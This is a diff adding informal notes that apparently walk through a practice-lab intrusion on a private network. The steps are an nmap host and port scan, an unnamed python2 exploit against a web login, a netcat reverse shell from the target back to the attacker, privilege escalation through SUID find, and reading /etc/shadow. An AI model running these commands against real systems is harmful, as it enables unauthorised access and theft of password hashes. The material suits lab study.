@@ -1,0 +1,36 @@
+
+sudo apt install nmap - Install Nmap for network discover
+
+sudo nmap -sn 192.168.56.0/24 - this will fetch the live machines in network
+
+sudo nmap -A 192.168.56.110 - to check target machine open ports
+
+intsall python script which is already downloaded
+
+python2 #name of the python file#
+
+python2 #name of the python file# -t http://192.168.56.110 -u username -p password
+
+log in to the web using 
+
+192.168.56.110/shell
+
+listen port 8080 in self machine 
+
+nc -lvp 8080
+
+in target machine = nc -nv 192.168.56.101 8080 -e '/bin/bash'
+
+once u get the access
+chechk
+cat /etc/passwd
+ls -al /etc/shadow
+/usr/bin/find
+ls -al /usr/bin/find
+find -exec '/bin/sh' \;
+cat /etc/shadow
+
+
+
+
+
